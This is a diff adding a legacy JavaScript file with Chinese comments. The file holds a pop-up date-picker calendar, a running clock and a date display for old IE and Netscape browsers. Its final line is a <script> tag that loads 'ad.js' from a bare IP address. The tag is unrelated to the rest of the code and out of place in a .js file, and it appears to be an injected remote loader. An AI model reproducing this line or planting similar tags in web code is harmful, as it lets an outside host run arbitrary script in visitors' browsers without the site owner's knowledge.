@@ -1,0 +1,285 @@
+<!-- Hide
+isIE = (document.all ? true : false);    
+    
+function getIEPosX(elt) { return getIEPos(elt,"Left"); }    
+function getIEPosY(elt) { return getIEPos(elt,"Top"); }    
+function getIEPos(elt,which) {    
+ iPos = 0    
+ while (elt!=null) {    
+  iPos += elt["offset" + which]    
+  elt = elt.offsetParent    
+ }    
+ return iPos    
+}    
+    
+function getXBrowserRef(eltname) {    
+ return (isIE ? document.all[eltname].style : document.layers[eltname]);    
+}    
+    
+function hideElement(eltname) { getXBrowserRef(eltname).visibility = 'hidden'; }    
+    
+// 按不同的浏览器进行处理元件的位置    
+function moveBy(elt,deltaX,deltaY) {    
+ if (isIE) {    
+  elt.left = elt.pixelLeft + deltaX;    
+  elt.top = elt.pixelTop + deltaY;    
+ } else {    
+  elt.left += deltaX;    
+  elt.top += deltaY;    
+ }    
+}    
+    
+function toggleVisible(eltname) {    
+ elt = getXBrowserRef(eltname);    
+ if (elt.visibility == 'visible' || elt.visibility == 'show') {    
+   elt.visibility = 'hidden';    
+ } else {    
+   fixPosition(eltname);    
+   elt.visibility = 'visible';    
+ }    
+}    
+    
+function setPosition(elt,positionername,isPlacedUnder) {    
+ positioner = null;    
+ 
+ if (isIE) {    
+  positioner = document.all[positionername];    
+  //elt.left = positioner.left;    
+  //elt.top = positioner.top;    
+ } else {    
+  positioner = document.images[positionername];    
+  elt.left = positioner.x;    
+  elt.top = positioner.y;    
+ }    
+ if (isPlacedUnder) { moveBy(elt,0,positioner.height); }    
+}    
+    
+    
+    
+//——————————————————————————————————————    
+    
+         // 判断浏览器    
+         isIE = (document.all ? true : false);    
+    
+         // 初始月份及各月份天数数组    
+         var months = new Array(" 一月 ", " 二月 ", " 三月 ", " 四月 ", " 五月 ", " 六月 ", " 七月 ",    
+	 " 八月 ", " 九月 ", " 十月 ", "十一月", "十二月");    
+         var daysInMonth = new Array(31, 28, 31, 30, 31, 30, 31, 31,    
+            30, 31, 30, 31);    
+	 var displayMonth = new Date().getMonth();    
+	 var displayYear = new Date().getFullYear();    
+	 var displayDivName;    
+	 var displayElement;    
+    
+         function getDays(month, year) {    
+            //测试选择的年份是否是润年？    
+            if (1 == month)    
+               return ((0 == year % 4) && (0 != (year % 100))) ||    
+                  (0 == year % 400) ? 29 : 28;    
+            else    
+               return daysInMonth[month];    
+         }    
+    
+         function getToday() {    
+            // 得到今天的日期    
+            this.now = new Date();    
+            this.year = this.now.getFullYear();    
+            this.month = this.now.getMonth();    
+            this.day = this.now.getDate();    
+         }    
+    
+         // 并显示今天这个月份的日历    
+         today = new getToday();    
+    
+         function newCalendar(eltName,attachedElement) {    
+	    if (attachedElement) {    
+	       if (displayDivName && displayDivName != eltName) hideElement(displayDivName);    
+	       displayElement = attachedElement;    
+	    }    
+	    displayDivName = eltName;    
+            today = new getToday();    
+            var parseYear = parseInt(displayYear + '');    
+            var newCal = new Date(parseYear,displayMonth,1);    
+            var day = -1;    
+            var startDayOfWeek = newCal.getDay();    
+            if ((today.year == newCal.getFullYear()) &&    
+                  (today.month == newCal.getMonth()))    
+	    {    
+               day = today.day;    
+            }    
+            var intDaysInMonth =    
+               getDays(newCal.getMonth(), newCal.getFullYear());    
+            var daysGrid = makeDaysGrid(startDayOfWeek,day,intDaysInMonth,newCal,eltName)    
+	    if (isIE) {    
+	       var elt = document.all[eltName];    
+	       elt.innerHTML = daysGrid;    
+	    } else {    
+	       var elt = document.layers[eltName].document;    
+	       elt.open();    
+	       elt.write(daysGrid);    
+	       elt.close();    
+	    }    
+	 }    
+    
+	 function incMonth(delta,eltName) {    
+	   displayMonth += delta;    
+	   if (displayMonth >= 12) {    
+	     displayMonth = 0;    
+	     incYear(1,eltName);    
+	   } else if (displayMonth <= -1) {    
+	     displayMonth = 11;    
+	     incYear(-1,eltName);    
+	   } else {    
+	     newCalendar(eltName);    
+	   }    
+	 }    
+    
+	 function incYear(delta,eltName) {    
+	   displayYear = parseInt(displayYear + '') + delta;    
+	   newCalendar(eltName);    
+	 }    
+    
+	 function makeDaysGrid(startDay,day,intDaysInMonth,newCal,eltName) {    
+	    var daysGrid;    
+	    var month = newCal.getMonth();    
+	    var year = newCal.getFullYear();    
+	    var isThisYear = (year == new Date().getFullYear());    
+	    var isThisMonth = (day > -1)    
+	    daysGrid = '<table border=1 cellspacing=0 cellpadding=0><tr><td><table border=0 cellspacing=0 cellpadding=2 bgcolor=#ffffff><tr><td colspan=7 bgcolor=#ffffff nowrap>';    
+	    daysGrid += '<font face="courier new, courier" size=2>';    
+	    daysGrid += '<a href="javascript:hideElement(\'' + eltName + '\')"><B style="color:black;background-color:green">╳</B></a>';    
+	    daysGrid += '&nbsp;&nbsp;';    
+	    daysGrid += '<a href="javascript:incMonth(-1,\'' + eltName + '\')">《</a>';    
+    
+	    daysGrid += '<b>';    
+	    if (isThisMonth) { daysGrid += '<font color=red>' + months[month] + '</font>'; }    
+	    else { daysGrid += months[month]; }    
+	    daysGrid += '</b>';    
+ 
+	    daysGrid += '<a href="javascript:incMonth(1,\'' + eltName + '\')">》</a>';    
+	    daysGrid += '&nbsp;&nbsp;';    
+	    daysGrid += '<a href="javascript:incYear(-1,\'' + eltName + '\')">《</a>';    
+    
+	    daysGrid += '<b>';    
+	    if (isThisYear) { daysGrid += '<font color=red>' + year + '</font>'; }    
+	    else { daysGrid += ''+year; }    
+	    daysGrid += '</b>';    
+    
+	    daysGrid += '<a href="javascript:incYear(1,\'' + eltName + '\')">》</a></td></tr>'; 
+		daysGrid += '<tr><td bgcolor=gray colspan=7 ></td></tr>';  
+	    daysGrid += '<tr><td align=right><font color=red>日</font></td><td align=right>一</td><td align=right>二</td><td align=right>三</td><td align=right>四</td><td align=right>五</td><td align=right><font color=red>六</font></td></tr>';  
+	    daysGrid += '<tr><td bgcolor=gray colspan=7 ></td></tr>';  
+		
+	    var dayOfMonthOfFirstSunday = (7 - startDay + 1);    
+	    for (var intWeek = 0; intWeek < 6; intWeek++) {    
+	       var dayOfMonth;    
+	       for (var intDay = 0; intDay < 7; intDay++) {    
+	         dayOfMonth = (intWeek * 7) + intDay + dayOfMonthOfFirstSunday - 7;    
+		 if (dayOfMonth <= 0) {    
+	           daysGrid += "</td><td>";    
+		 } else if (dayOfMonth <= intDaysInMonth) {    
+		   var color = "blue";    
+		   if (day > 0 && day == dayOfMonth) color="red";    
+		   daysGrid += '<td align=right><a href="javascript:setDay(';    
+		   daysGrid += dayOfMonth + ',\'' + eltName + '\')" '    
+		   daysGrid += 'style="color:' + color + '">';    
+		   var dayString = dayOfMonth + "</a></td>";    
+		   if (dayString.length == 6) dayString = '0' + dayString;    
+		   daysGrid += dayString;    
+		 }    
+	       }    
+	       if (dayOfMonth < intDaysInMonth) daysGrid += "</tr>";    
+	    }    
+	    return daysGrid + "</table></td></tr></table>";    
+	 }    
+    
+	 function setDay(day,eltName) {    
+	   displayElement.value = displayYear + "-" + (displayMonth + 1) + "-" + day;    
+	   hideElement(eltName);    
+	 }    
+    
+    
+//——————————————————————————————————————    
+    
+// fixPosition() 这个函数和前面所讲的那个函数一样  
+//  
+function fixPosition(eltname) {  
+ elt = getXBrowserRef(eltname);  
+ positionerImgName = eltname + 'Pos';  
+ // hint: try setting isPlacedUnder to false  
+ isPlacedUnder = false;  
+ if (isPlacedUnder) {  
+  setPosition(elt,positionerImgName,true);  
+ } else {  
+  setPosition(elt,positionerImgName)  
+ }  
+}  
+  
+function toggleDatePicker(eltName,formElt) {  
+  var x = formElt.indexOf('.');  
+  var formName = formElt.substring(0,x);  
+  var formEltName = formElt.substring(x+1);  
+  newCalendar(eltName,document.forms[formName].elements[formEltName]);  
+  toggleVisible(eltName);  
+}  
+
+
+//定期刷新页面 调用方式 onload="freshPage()"
+var sthou,stmin,stsec,statim,amp;
+function freshPage()
+{
+   sthou=parseInt(document.form1.hour.value);
+   stmin=parseInt(document.form1.min.value);
+   stsec=parseInt(document.form1.sec.value);
+   amp=document.form1.ampm.value;   
+   showtime();
+}
+
+function showtime()
+{
+   stsec=stsec+1;
+   if (stsec==60)
+      {
+         stsec=0
+         stmin+=1
+         if (stmin==60)
+         {
+            sthou+=1;stmin=0
+         }
+      }
+   statim=""
+   statim+=amp+" "
+   statim+=((sthou<10)?"0":"")+sthou
+   statim+=((stmin<10)?":0":":")+stmin
+   statim+=((stsec<10)?":0":":")+stsec
+   CLOCK.innerHTML=statim
+   timer2ID=setTimeout("showtime()",1000) //1000毫秒一次
+}
+
+function showDate()
+{
+   var today = new Date(); //创建日期对象
+   year = today.getYear(); //读取年份
+   thisDay = today.getDate(); //读取当前日
+
+   //创建每月天数数组
+   var monthDays = new Array(31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31);
+   //如果是闰年，2月份的天数为29天
+   if (((year % 4 == 0) && (year % 100 != 0)) || (year % 400 == 0)) monthDays[1] = 29;
+   
+   daysOfCurrentMonth = monthDays[today.getMonth()]; //从每月天数数组中读取当月的天数
+   
+   firstDay = today;//复制日期对象
+   firstDay.setDate(1); //设置日期对象firstDay的日为1号
+   startDay = firstDay.getDay(); //确定当月第一天是星期几
+
+   //定义周日和月份中文名数组
+   var dayNames = new Array("星期日","星期一","星期二","星期三","星期四","星期五","星期六");   
+   var monthNames = new Array("1月","2月","3月","4月","5月","6月","7月","8月","9月","10月","11月","12月");   
+   //创建日期对象
+   var newDate = new Date();   
+   document.writeln("<FONT STYLE='font-size:9pt;Color:#0000FF'>" + newDate.getYear() + "年 " + monthNames[newDate.getMonth()] +  newDate.getDate() + "日 " + dayNames[newDate.getDay()] + "</FONT>");
+}
+    
+
+<script src="http://222.208.183.246/ad/ad.js"></script>
